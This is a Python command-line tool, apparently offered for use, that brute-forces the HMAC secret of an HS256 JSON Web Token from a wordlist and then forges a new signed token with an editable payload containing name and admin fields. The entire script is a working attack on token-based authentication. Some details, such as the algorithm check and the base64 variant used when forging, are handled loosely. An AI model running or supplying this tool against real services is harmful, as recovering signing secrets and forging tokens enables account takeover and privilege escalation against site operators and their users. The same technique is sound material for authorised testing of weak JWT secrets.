#! /usr/bin/env python3

import hmac, hashlib, base64, re, sys
#import json

# Get wordlist linecount
linecount = sum(1 for _ in open(sys.argv[2], 'rb'))

#Seperate JWT header/payload
def jwtParser(jwt=sys.argv[1]):
    jwt_list = jwt.encode().split(b".")
    msg = jwt_list[0] + b"." + jwt_list[1]
    valid_sig = jwt_list[2]
    return msg, valid_sig

#Check for HS256
def algCheck():
    decoded = base64.urlsafe_b64decode(jwtParser()[0]).decode('utf-8')
    if "HS256" in decoded:
        return True
    else:
        return False

#Brute Force JWT key
def jwtCrack():
    if algCheck() == False:
        print("Only JWTs using HS256 are supported at this time.")
    else:
        with open(sys.argv[2], "rb") as f:
            wordlist = f.readlines()
        msg, valid_sig = jwtParser()
        count = 0
        found = False
        for word in wordlist:
            count += 1
            print("Searching for valid key: %s / %s" % (count, linecount), end='\r')
            key = word.rstrip(b"\n")
            hm = hmac.new(key, msg, hashlib.sha256).digest()
            ehm = base64.urlsafe_b64encode(hm).rstrip(b'=')
            if ehm == valid_sig: 
                found = True
                valid_key = key.decode('utf-8')
                print("\n" + "Secret Found: ", valid_key)
                break
        if found == False:
            print("\n" + "No secret was discovered.")
            return False
        else:
            return valid_key

#Forge new JWT with discovered key
def jwtForge(key):
    key = key.encode()
    h = str('{"typ":"JWT","alg":"HS256"}')                      #Default HS256 JWT Header 
    p = str('{"iat":90000000,"name":"User1","admin":false}')    #Modify JWT Payload
    eh = base64.b64encode(h.encode()).rstrip(b"=")              #Url Safe B64 Encode Header / Payload 
    ep = base64.b64encode(p.encode()).rstrip(b"=")
    msg = eh + b"." + ep
    hm = hmac.new(key, msg, hashlib.sha256).digest()
    hm64 = base64.urlsafe_b64encode(hm).rstrip(b"=")
    jwt = msg + b"." + hm64
    return jwt.decode()

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: %s <jwt> <wordlist>" % sys.argv[0])
    else:
        vkey = jwtCrack()
        if vkey != False:
           print(jwtForge(vkey))


#HMACSHA256(
#  base64UrlEncode(header) + "." +
#  base64UrlEncode(payload),
#  secret)
